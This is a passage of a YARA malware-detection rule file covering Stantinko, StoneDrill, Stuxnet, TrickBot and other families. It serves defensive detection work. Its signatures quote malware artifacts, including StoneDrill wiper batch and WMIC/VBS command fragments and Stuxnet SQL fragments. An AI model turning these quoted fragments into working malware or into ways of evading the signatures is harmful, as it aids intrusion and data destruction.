5\n        vti_static_score = 5\n        author = \"Marc-Etienne M.L\u00e9veill\u00e9\"\n        source = \"https://github.com/eset/malware-ioc\"\n        original_name = \"stantinko_droppers\"\n        license = \"BSD-2-Clause (https://opensource.org/licenses/BSD-2-Clause)\"\n\n    strings:\n        $s1 = {55 8B EC 83 EC 08 53 56 BE 80 F4 45 00 57 81 EE 80 0E 41 00 56 E8 6D 23 00 00 56 8B D8 68 80 0E 41 00 53 89 5D F8 E8 65 73 00 00 8B 0D FC F5 45}\n        $s2 = {7E 5E 7F 8C 08 46 00 00 AB 57 1A BB 91 5C 00 00 FA CC FD 76 90 3A 00 00}\n\n    condition:\n        uint16(0) == 0x5A4D and 1 of them\n}\n\nrule stantinko_d3d\n{\n    meta:\n        description = \"Stantinko adware d3dadapter component\"\n        ref = \"https://www.welivesecurity.com/wp-content/uploads/2017/07/Stantinko.pdf\"\n        classifications = \"Adware\"\n        threat_names = \"Stantinko\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Marc-Etienne M.L\u00e9veill\u00e9\"\n        source = \"https://github.com/eset/malware-ioc\"\n        original_name = \"stantinko_d3d\"\n        license = \"BSD-2-Clause (https://opensource.org/licenses/BSD-2-Clause)\"\n\n    condition:\n        pe.exports(\"EntryPoint\") and pe.exports(\"ServiceMain\") and pe.imports(\"WININET.DLL\" , \"HttpAddRequestHeadersA\")\n}\n\nrule stantinko_ihctrl32\n{\n    meta:\n        description = \"Stantinko adware ihctrl32 component\"\n        ref = \"https://www.welivesecurity.com/wp-content/uploads/2017/07/Stantinko.pdf\"\n        classifications = \"Adware\"\n        threat_names = \"Stantinko\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Marc-Etienne M.L\u00e9veill\u00e9\"\n        source = \"https://github.com/eset/malware-ioc\"\n        original_name = \"stantinko_ihctrl32\"\n        license = \"BSD-2-Clause (https://opensource.org/licenses/BSD-2-Clause)\"\n\n    strings:\n        $s1 = \"ihctrl32.dll\"\n        $s2 = \"win32_hlp\"\n        $s3 = \"Ihctrl32Main\"\n        $s4 = \"I%citi%c%size%s%c%ci%s\"\n        $s5 = \"Global\\\\Intel_hctrl32\"\n\n    condition:\n        2 of them\n}\n\nrule stantinko_wsaudio\n{\n    meta:\n        description = \"Stantinko adware wsaudio component\"\n        ref = \"https://www.welivesecurity.com/wp-content/uploads/2017/07/Stantinko.pdf\"\n        classifications = \"Adware\"\n        threat_names = \"Stantinko\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Marc-Etienne M.L\u00e9veill\u00e9\"\n        source = \"https://github.com/eset/malware-ioc\"\n        original_name = \"stantinko_wsaudio\"\n        license = \"BSD-2-Clause (https://opensource.org/licenses/BSD-2-Clause)\"\n\n    strings:\n        $s1 = \"GetInterface\"\n        $s2 = \"wsaudio.dll\"\n        $s3 = \"Global\\\\Wsaudio_Initialize\"\n        $s4 = \"SOFTWARE\\\\Classes\\\\%s.FieldListCtrl.1\\\\\"\n\n    condition:\n        2 of them\n}\n\nrule stantinko_ghstore\n{\n    meta:\n        description = \"Stantinko adware ghstore component\"\n        ref = \"https://www.welivesecurity.com/wp-content/uploads/2017/07/Stantinko.pdf\"\n        classifications = \"Adware\"\n        threat_names = \"Stantinko\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Marc-Etienne M.L\u00e9veill\u00e9\"\n        source = \"https://github.com/eset/malware-ioc\"\n        original_name = \"stantinko_ghstore\"\n        license = \"BSD-2-Clause (https://opensource.org/licenses/BSD-2-Clause)\"\n\n    strings:\n        $s1 = \"G%cost%sSt%c%s%s%ce%sr\" wide\n        $s2 = \"%cho%ct%sS%sa%c%s%crve%c\" wide\n        $s3 = \"Par%c%ce%c%c%s\" wide\n        $s4 = \"S%c%curity%c%s%c%s\" wide\n        $s5 = \"Sys%c%s%c%c%su%c%s%clS%c%s%serv%s%ces\" wide\n\n    condition:\n        3 of them\n}\n\nrule StoneDrill_main_sub\n{\n    meta:\n        description = \"StoneDrill wiper\"\n        ref = \"https://securelist.com/blog/research/77725/from-shamoon-to-stonedrill/\"\n        classifications = \"Wiper\"\n        threat_names = \"StoneDrill\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Kaspersky Lab\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"StoneDrill_main_sub\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $code = {B8 08 00 FE 7F FF 30 8F 44 24 ?? 68 B4 0F 00 00 FF 15 ?? ?? ?? 00 B8 08 00 FE 7F FF 30 8F 44 24 ?? 8B ?? 24 [1 - 4] 2B ?? 24 [6] F7 ?1 [5 - 12] 00}\n\n    condition:\n        uint16(0) == 0x5A4D and $code and filesize < 5000000\n}\n\nrule StoneDrill_BAT_1\n{\n    meta:\n        description = \"StoneDrill wiper Batch file\"\n        ref = \"https://securelist.com/blog/research/77725/from-shamoon-to-stonedrill/\"\n        classifications = \"Wiper\"\n        threat_names = \"StoneDrill\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"StoneDrill_BAT_1\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"set u100=\" ascii\n        $s2 = \"set u200=service\" ascii fullword\n        $s3 = \"set u800=%~dp0\" ascii fullword\n        $s4 = \"\\\"%systemroot%\\\\system32\\\\%u100%\\\"\" ascii\n        $s5 = \"%\\\" start /b %systemroot%\\\\system32\\\\%\" ascii\n\n    condition:\n        uint32(0) == 0x68636540 and 2 of them and filesize < 500\n}\n\nrule StoneDrill_Service_Install\n{\n    meta:\n        description = \"StoneDrill wiper Batch file\"\n        ref = \"https://securelist.com/blog/research/77725/from-shamoon-to-stonedrill/\"\n        classifications = \"Wiper\"\n        threat_names = \"StoneDrill\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"StoneDrill_Service_Install\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"127.0.0.1 >nul && sc config\" ascii\n        $s2 = \"LocalService\\\" && ping -n\" ascii fullword\n        $s3 = \"127.0.0.1 >nul && sc start\" ascii fullword\n        $s4 = \"sc config NtsSrv binpath= \\\"C:\\\\WINDOWS\\\\system32\\ntssrvr64.exe\" ascii\n\n    condition:\n        2 of them and filesize < 500\n}\n\nrule StoneDrill_ntssrvr32\n{\n    meta:\n        description = \"StoneDrill wiper\"\n        ref = \"https://securelist.com/blog/research/77725/from-shamoon-to-stonedrill/\"\n        classifications = \"Wiper\"\n        threat_names = \"StoneDrill\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"StoneDrill_ntssrvr32\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"g\\\\system32\\\\\" fullword wide\n        $s2 = \"ztvttw\" fullword wide\n        $s3 = \"lwizvm\" fullword ascii\n        $op1 = { 94 35 77 73 03 40 eb e9 }\n        $op2 = { 80 7c 41 01 00 74 0a 3d }\n        $op3 = { 74 0a 3d 00 94 35 77 }\n\n    condition:\n        (uint16(0) == 0x5a4d and filesize < 4000KB and 3 of them)\n}\n\nrule StoneDrill_Malware_2\n{\n    meta:\n        description = \"StoneDrill wiper\"\n        ref = \"https://securelist.com/blog/research/77725/from-shamoon-to-stonedrill/\"\n        classifications = \"Wiper\"\n        threat_names = \"StoneDrill\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"StoneDrill_Malware_2\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"cmd /c WMIC Process Call Create \\\"C:\\\\Windows\\\\System32\\\\Wscript.exe //NOLOGO \" fullword wide\n        $s2 = \"C:\\\\ProgramData\\\\InternetExplorer\" fullword wide\n        $s3 = \"WshShell.CopyFile \\\"\" fullword wide\n        $s4 = \"Abd891.tmp\" fullword wide\n        $s5 = \"Set WshShell = Nothing\" fullword wide\n        $s6 = \"AaCcdDeFfGhiKLlMmnNoOpPrRsSTtUuVvwWxyZz32\" fullword ascii\n        $s7 = \"\\\\FileInfo.txt\" fullword wide\n        $x1 = \"C-PDI-C-Cpy-T.vbs\" fullword wide\n        $x2 = \"C-Dlt-C-Org-T.vbs\" fullword wide\n        $x3 = \"C-PDC-C-Cpy-T.vbs\" fullword wide\n        $x4 = \"AC-PDC-C-Cpy-T.vbs\" fullword wide\n        $x5 = \"C-Dlt-C-Trsh-T.tmp\" fullword wide\n\n    condition:\n        (uint16(0) == 0x5a4d and filesize < 700KB and (1 of ($x*) or 3 of ($s*))) or 5 of them\n}\n\nrule StoneDrill\n{\n    meta:\n        description = \"StoneDrill wiper\"\n        ref = \"https://securelist.com/blog/research/77725/from-shamoon-to-stonedrill/\"\n        classifications = \"Wiper\"\n        threat_names = \"StoneDrill\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"StoneDrill\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $x1 = \"C-Dlt-C-Trsh-T.tmp\" fullword wide\n        $x2 = \"C-Dlt-C-Org-T.vbs\" fullword wide\n        $s1 = \"Hello dear\" fullword ascii\n        $s2 = \"WRZRZRAR\" fullword ascii\n        $opa1 = { 66 89 45 d8 6a 64 ff }\n        $opa2 = { 8d 73 01 90 0f bf 51 fe }\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 700KB and 1 of ($x*) or (all of ($op*) and all of ($s*))\n}\n\nrule StoneDrill_VBS_1\n{\n    meta:\n        description = \"StoneDrill wiper\"\n        ref = \"https://securelist.com/blog/research/77725/from-shamoon-to-stonedrill/\"\n        classifications = \"Wiper\"\n        threat_names = \"StoneDrill\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"StoneDrill_VBS_1\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $x1 = \"wmic /NameSpace:\\\\\\\\root\\\\default Class StdRegProv Call SetStringValue hDefKey = \\\"&H80000001\\\" sSubKeyName = \\\"Software\\\\Micros\" ascii\n        $x2 = \"ping 1.0.0.0 -n 1 -w 20000 > nul\" fullword ascii\n        $s1 = \"WshShell.CopyFile \\\"%COMMON_APPDATA%\\\\Chrome\\\\\" ascii\n        $s2 = \"WshShell.DeleteFile \\\"%temp%\\\\\" ascii\n        $s3 = \"WScript.Sleep(10 * 1000)\" fullword ascii\n        $s4 = \"Set WshShell = CreateObject(\\\"Scripting.FileSystemObject\\\") While WshShell.FileExists(\\\"\" ascii\n        $s5 = \" , \\\"%COMMON_APPDATA%\\\\Chrome\\\\\" ascii\n\n    condition:\n        (filesize < 1KB and 1 of ($x*) or 2 of ($s*))\n}\n\nrule Stration\n{\n    meta:\n        description = \"Stration Worm\"\n        threat_names = \"Stration,Warezov\"\n        classifications = \"Worm\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"VMRay Labs\"\n\n    strings:\n        $ev1 = \"SOFTWARE\\\\Zone Labs\\\\ZoneAlarm\" wide ascii\n        $ev2 = \"vsmon\" wide ascii\n        $ev3 = \"ActiveZA\" wide ascii\n        $ev4 = \"SOFTWARE\\\\Sygate Technologies, Inc.\\\\Sygate Personal Firewall\" wide ascii\n        $ev5 = \"SmcService\" wide ascii\n        $ev6 = \"ActiveSG\" wide ascii\n        $ev7 = \"SOFTWARE\\\\Symantec\\\\InstalledApps\" wide ascii\n        $ev8 = \"SOFTWARE\\\\Symantec\\\\Internet Security\" wide ascii\n        $ev9 = \"Symantec Core LC\" wide ascii\n        $ev10 = \"ActiveNIS\" wide ascii\n        $ev11 = \"SOFTWARE\\\\Agnitum\\\\Outpost Firewall\" wide ascii\n        $ev12 = \"OutpostFirewall\" wide ascii\n        $ev13 = \"ActiveOP\" wide ascii\n        $ev14 = \"SOFTWARE\\\\McAfee.com\\\\Personal Firewall\" wide ascii\n        $ev15 = \"MpfService\" wide ascii\n        $ev16 = \"ActiveMA\" wide ascii\n        $ev17 = \"SOFTWARE\\\\Kerio\\\\WinRoute\" wide ascii\n        $ev18 = \"WinRoute\" wide ascii\n\n        $pos1 = \"cmut449c14b7.dll\" wide ascii\n        $pos2 = \"type=s&p=%d&r=%d&m=%d\" wide ascii\n        $pos3 = \"[%d] %s\" wide ascii\n        $pos4 = \"%02X%02X%02X%02X%02X%02X%02X%02X%02X%02X\" wide ascii\n\n        $smtp1 = \"HELO %s\" wide ascii\n        $smtp2 = \"MAIL FROM: <%s>\" wide ascii\n        $smtp3 = \"RCPT TO: <%s>\" wide ascii\n        $smtp4 = \"To: %s\" wide ascii\n        $smtp5 = \"Subject: %s\" wide ascii\n        $smtp6 = \"boundary=\\\"%s\\\"\" wide ascii\n        $smtp7 = \"Content-Type: APPLICATION/OCTET-STREAM; name=\\\"%s\\\"\" wide ascii\n        $smtp8 = \"Content-Disposition: attachment; filename=\\\"%s\\\"\" wide ascii\n\n    condition:\n        // Memory dump, function string file or file with PE header\n        (\n            mime_type == \"application/octet-stream\"\n            or mime_type == \"text/plain\"\n            or (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550)\n        )\n        and (10 of ($ev*) or 6 of ($smtp*))\n        and all of ($pos*)\n}\n\nrule StuxNet_Malware_1\n{\n    meta:\n        description = \"Stuxnet worm\"\n        classifications = \"Worm\"\n        threat_names = \"Stuxnet\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"StuxNet_Malware_1\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $op1 = { 8b 45 08 35 dd 79 19 ae 33 c9 8b 55 08 89 02 89 }\n        $op2 = { 74 36 8b 7f 08 83 ff 00 74 2e 0f b7 1f 8b 7f 04 }\n        $op3 = { 74 70 81 78 05 8d 54 24 04 75 1b 81 78 08 04 cd }\n\n    condition:\n        all of them\n}\n\nrule Stuxnet_Malware_2\n{\n    meta:\n        description = \"Stuxnet worm\"\n        classifications = \"Worm\"\n        threat_names = \"Stuxnet\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"Stuxnet_Malware_2\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $s1 = \"\\\\SystemRoot\\\\System32\\\\hal.dll\" fullword wide\n        $s2 = \"http://www.jmicron.co.tw0\" fullword ascii\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 70KB and all of them\n}\n\nrule StuxNet_dll\n{\n    meta:\n        description = \"Stuxnet worm\"\n        classifications = \"Worm\"\n        threat_names = \"Stuxnet\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"StuxNet_dll\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $s1 = \"SUCKM3 FROM EXPLORER.EXE MOTH4FUCKA #@!\" fullword ascii\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 100KB and $s1\n}\n\nrule Stuxnet_Shortcut_to\n{\n    meta:\n        description = \"Stuxnet worm\"\n        classifications = \"Worm\"\n        threat_names = \"Stuxnet\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"Stuxnet_Shortcut_to\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $x1 = \"\\\\\\\\.\\\\STORAGE#Volume#_??_USBSTOR#Disk&Ven_Kingston&Prod_DataTraveler_2.0&Rev_PMAP#5B6B098B97BE&0#{53f56307-b6bf-11d0-94f2-00a0c\" wide\n\n    condition:\n        uint16(0) == 0x004c and filesize < 10KB and $x1\n}\n\nrule Stuxnet_Malware_3\n{\n    meta:\n        description = \"Stuxnet worm\"\n        classifications = \"Worm\"\n        threat_names = \"Stuxnet\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"Stuxnet_Malware_3\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $x1 = \"SHELL32.DLL.ASLR.\" fullword wide\n        $s1 = \"~WTR4141.tmp\" fullword wide\n        $s2 = \"~WTR4132.tmp\" fullword wide\n        $s3 = \"totalcmd.exe\" fullword wide\n        $s4 = \"wincmd.exe\" fullword wide\n        $s5 = \"http://www.realtek.com0\" fullword ascii\n        $s6 = \"{%08x-%08x-%08x-%08x}\" fullword wide\n\n    condition:\n        (uint16(0) == 0x5a4d and filesize < 150KB and ($x1 or 3 of ($s*))) or (5 of them)\n}\n\nrule Stuxnet_Malware_4\n{\n    meta:\n        description = \"Stuxnet worm\"\n        classifications = \"Worm\"\n        threat_names = \"Stuxnet\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"Stuxnet_Malware_4\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $x1 = \"\\\\objfre_w2k_x86\\\\i386\\\\guava.pdb\" ascii\n        $x2 = \"MRxCls.sys\" fullword wide\n        $x3 = \"MRXNET.Sys\" fullword wide\n\n    condition:\n        (uint16(0) == 0x5a4d and filesize < 80KB and 1 of them) or (all of them)\n}\n\nrule Stuxnet_maindll_decrypted_unpacked\n{\n    meta:\n        description = \"Stuxnet worm\"\n        classifications = \"Worm\"\n        threat_names = \"Stuxnet\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"Stuxnet_maindll_decrypted_unpacked\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $s1 = \"%SystemRoot%\\\\system32\\\\Drivers\\\\mrxsmb.sys;%SystemRoot%\\\\system32\\\\Drivers\\\\*.sys\" fullword wide\n        $s2 = \"<Actions Context=\\\"%s\\\"><Exec><Command>%s</Command><Arguments>%s,#%u</Arguments></Exec></Actions>\" fullword wide\n        $s3 = \"%SystemRoot%\\\\inf\\\\oem7A.PNF\" fullword wide\n        $s4 = \"%SystemRoot%\\\\inf\\\\mdmcpq3.PNF\" fullword wide\n        $s5 = \"%SystemRoot%\\\\inf\\\\oem6C.PNF\" fullword wide\n        $s6 = \"@abf varbinary(4096) EXEC @hr = sp_OACreate 'ADODB.Stream', @aods OUT IF @hr <> 0 GOTO endq EXEC @hr = sp_OASetProperty @\" wide\n        $s7 = \"STORAGE#Volume#1&19f7e59c&0&\" fullword wide\n        $s8 = \"view MCPVREADVARPERCON as select VARIABLEID,VARIABLETYPEID,FORMATFITTING,SCALEID,VARIABLENAME,ADDRESSPARAMETER,PROTOKOLL,MAXLIMI\" ascii\n\n    condition:\n        6 of them\n}\n\nrule Stuxnet_s7hkimdb\n{\n    meta:\n        description = \"Stuxnet worm\"\n        classifications = \"Worm\"\n        threat_names = \"Stuxnet\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"Stuxnet_s7hkimdb\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $x1 = \"S7HKIMDX.DLL\" fullword wide\n        $op1 = { 8b 45 08 35 dd 79 19 ae 33 c9 8b 55 08 89 02 89 }\n        $op2 = { 74 36 8b 7f 08 83 ff 00 74 2e 0f b7 1f 8b 7f 04 }\n        $op3 = { 74 70 81 78 05 8d 54 24 04 75 1b 81 78 08 04 cd }\n\n    condition:\n        (uint16(0) == 0x5a4d and filesize < 40KB and $x1 and all of ($op*))\n}\n\nrule T5000\n{\n    meta:\n        description = \"T5000 backdoor\"\n        classifications = \"Backdoor, Spyware\"\n        threat_names = \"T5000\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Seth Hardy\"\n        source = \"https://github.com/ctxis/CAPE\"\n        original_name = \"T5000\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $ = \"_tmpR.vbs\"\n        $ = \"_tmpg.vbs\"\n        $ = \"Dtl.dat\" wide ascii\n        $ = \"3C6FB3CA-69B1-454f-8B2F-BD157762810E\"\n        $ = \"EED5CA6C-9958-4611-B7A7-1238F2E1B17E\"\n        $ = \"8A8FF8AD-D1DE-4cef-B87C-82627677662E\"\n        $ = \"43EE34A9-9063-4d2c-AACD-F5C62B849089\"\n        $ = \"A8859547-C62D-4e8b-A82D-BE1479C684C9\"\n        $ = \"A59CF429-D0DD-4207-88A1-04090680F714\"\n        $ = \"utd_CE31\" wide ascii\n        $ = \"f:\\\\Project\\\\T5000\\\\Src\\\\Target\\\\1 KjetDll.pdb\"\n        $ = \"l:\\\\MyProject\\\\Vc 7.1\\\\T5000\\\\T5000Ver1.28\\\\Target\\\\4 CaptureDLL.pdb\"\n        $ = \"f:\\\\Project\\\\T5000\\\\Src\\\\Target\\\\4 CaptureDLL.pdb\"\n        $ = \"E:\\\\VS2010\\\\xPlat2\\\\Release\\\\InstRes32.pdb\"\n\n    condition:\n        any of them\n}\n\nrule TeleDoor_Backdoor\n{\n    meta:\n        description = \"TeleDoor backdoor\"\n        ref = \"https://goo.gl/CpfJQQ\"\n        classifications = \"Backdoor\"\n        threat_names = \"TeleDoor\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"TeleDoor_Backdoor\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $c1 = { 50 61 79 6C 6F 61 64 00 41 75 74 6F 50 61 79 6C 6F 61 64 }\n        $c2 = { 52 75 6E 43 6D 64 00 44 75 6D 70 44 61 74 61 }\n        $c3 = { 00 5A 76 69 74 57 65 62 43 6C 69 65 6E 74 45 78 74 00 4D 69 6E 49 6E 66 6F }\n\n    condition:\n        (uint16(0) == 0x5a4d and filesize < 15000KB and 2 of them)\n}\n\nrule Tinba2 : banking\n{\n    meta:\n        description = \"Tinba 2 banking trojan\"\n        threat_names = \"Tinba 2\"\n        ref = \"https://securityintelligence.com/tinba-malware-reloaded-and-attacking-banks-around-the-world\"\n        classifications = \"Spyware\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"n3sfox <n3sfox@gmail.com>\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"Tinba2\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $str1 = \"MapViewOfFile\"\n        $str2 = \"OpenFileMapping\"\n        $str3 = \"NtCreateUserProcess\"\n        $str4 = \"NtQueryDirectoryFile\"\n        $str5 = \"RtlCreateUserThread\"\n        $str6 = \"DeleteUrlCacheEntry\"\n        $str7 = \"PR_Read\"\n        $str8 = \"PR_Write\"\n        $pubkey = \"BEGIN PUBLIC KEY\"\n        $code1 = {50 87 44 24 04 6A ?? E8}\n\n    condition:\n        all of ($str*) and $pubkey and $code1\n}\n\nrule TrickBot_Module\n{\n    meta:\n        description = \"Unencrypted TrickBot module\"\n        classifications = \"Spyware, Bot\"\n        threat_names = \"TrickBot\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"VMRay Labs\"\n\n    condition:\n        // is a DLL\n        pe.characteristics & pe.DLL\n        // resolves imports at runtime\n        and pe.number_of_imports == 0\n        // has the correct exports\n        and pe.exports(\"Control\")\n        and pe.exports(\"FreeBuffer\")\n        and pe.exports(\"Release\")\n        and pe.exports(\"Start\")\n}\n\nrule Obfuscated_TrickBot_Module\n{\n    meta:\n        description = \"Partly Obfuscated TrickBot module\"\n        classifications = \"Spyware, Bot\"\n        threat_names = \"TrickBot\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"VMRay Labs\"\n    strings:\n        $export_1 = \"Control\"\n        $export_2 = \"FreeBuffer\"\n        $export_3 = \"Release\"\n        $export_4 = \"Start\"\n        $reflective = \"ReflectiveLoader\"\n    condition:\n        // is a DLL\n        pe.characteristics & pe.DLL\n        // resolves imports at runtime\n        and pe.number_of_imports == 0\n        // exports not yet resolved\n        and pe.number_of_exports == 0\n        and all of ($export_*) and $reflective\n}\n\nrule TrickBot_Module_Systeminfo\n{\n     meta:\n        description = \"TrickBot's systeminfo module\"\n        classifications = \"Spyware, Bot\"\n        threat_names = \"TrickBot, Systeminfo\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"VMRay Labs\"\n        \n    strings:\n        $config_module    = \"<moduleconfig>\"\n        $config_autostart = \"<autostart>\"\n        $result_cpu       = \"<cpu>%s</cpu>\" wide\n        $result_ram       = \"<ram>%s</ram>\" wide\n        $result_user      = \"<user>%s</user>\" wide\n        $result_installed = \"<installed>\" wide\n        $result_program   = \"<program>%s</program>\" wide\n        $result_service   = \"<service>%s</service>\" wide\n\n    condition:\n        (TrickBot_Module or Obfuscated_TrickBot_Module)\n        and all of ($config*)\n        and 4 of ($result*)\n}\n\nrule TrickBot_Module_InjectDll\n{\n     meta:\n        description = \"TrickBot's injectDll module\"\n        classifications = \"Spyware, Bot\"\n        threat_names = \"TrickBot, InjectDll\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"VMRay Labs\"\n        \n    strings:\n        $prep_escalate = \"ImpersonateLoggodOnUser\"\n        $prep_findproc = \"Process32First\"\n        $prep_cert = \"CertCreateSelfSignCertificate\"\n\n        $config_parser_1 = \"EnumDpostServer\"\n        $config_parser_2 = \"ConfigInitDynamic\"\n        $config_parser_3 = \"ConfigInitStatic\"\n\n        $version_chrome = \"Google\\\\Chrome\\\\BLBeacon\"\n        $version_ie_form = \"IE version real: %s\"\n        $version_ff_form = \"Mozilla Firefox version: %s\"\n\n    condition:\n        (TrickBot_Module or Obfuscated_TrickBot_Module)\n        and 2 of ($prep*)\n        and 2 of ($config_parser*)\n        and 2 of ($version*)\n}\n\nrule TrickBot_Module_Mailsearcher\n{\n    meta:\n        description = \"TrickBot banking trojan mailsearcher module\"\n        classifications = \"Spyware, Bot\"\n        threat_names = \"TrickBot, 